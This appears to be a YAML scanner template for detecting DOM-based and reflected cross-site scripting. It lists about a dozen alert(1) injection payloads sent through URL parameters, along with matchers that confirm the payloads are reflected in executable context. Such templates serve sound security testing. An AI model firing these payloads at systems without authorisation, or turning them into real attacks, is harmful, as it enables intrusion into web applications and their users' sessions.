id: xss-dom-based
name: DOM-Based Cross-Site Scripting (XSS)
version: 2.0
author: GochaOqradze
severity: high
description: >
  Detects DOM-based and reflected cross-site scripting by injecting
  context-aware payloads through URL parameters. Covers HTML tag injection,
  attribute breakout, JavaScript context escape, and event handler abuse.
  Multi-layer matching validates reflection in executable context while
  suppressing database error and WAF false positives.

tags:
  - xss
  - dom-xss
  - injection
  - client-side
  - owasp-top10

metadata:
  cwe: CWE-79
  owasp: A03:2021

references:
  - https://owasp.org/www-community/attacks/DOM_Based_XSS
  - https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
  - https://portswigger.net/web-security/cross-site-scripting/dom-based

requests:
  - method: GET
    path:
      - "/page?q={{payload}}"
      - "/search?query={{payload}}"
      - "/view?name={{payload}}"
      - "/redirect?url={{payload}}"

    redirects: true

    attack: batteringram
    payloads:
      payload:
        # HTML tag injection
        - '<svg/onload=alert(1)>'
        - '<img src=x onerror=alert(1)>'
        - '<details/open/ontoggle=alert(1)>'
        - '</script><svg/onload=alert(1)>'

        # Attribute breakout (double / single quote)
        - '" autofocus onfocus=alert(1) x="'
        - "' autofocus onfocus=alert(1) x='"
        - '/"><svg/onload=alert(1)>'

        # JavaScript context escape
        - "'-alert(1)-'"
        - '"-alert(1)-"'
        - "';alert(1)//"
        - '";alert(1)//'
        - "}-alert(1)-{"
        - "*/alert(1);/*"

        # Protocol handler
        - "javascript:alert(1)"

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      # Response must be HTTP 200
      - type: status
        status:
          - 200

      # Response must be HTML
      - type: word
        part: header
        words:
          - "text/html"

      # Payload reflected in executable context
      - type: word
        part: body
        words:
          - "onerror=alert(1)"
          - "onload=alert(1)"
          - "ontoggle=alert(1)"
          - "onfocus=alert(1)"
          - "-alert(1)-"
          - ";alert(1)//"
          - ";alert(1);/*"
          - "javascript:alert(1)"
        condition: or

      # Suppress database / application error false positives
      - type: word
        part: body
        negative: true
        words:
          - "SQL syntax"
          - "You have an error in your SQL"
          - "mysql_"
          - "MySQLSyntaxErrorException"
          - "ORA-"
          - "PG::SyntaxError"
          - "Unclosed quotation mark"
          - "sqlite3.OperationalError"
          - "SQLSTATE["
          - "Microsoft OLE DB"
          - "JDBC Exception"
        condition: or

    extractors:
      - type: regex
        name: reflected_context
        part: body
        regex:
          - '.{0,40}(alert\(1\)).{0,40}'
        group: 0
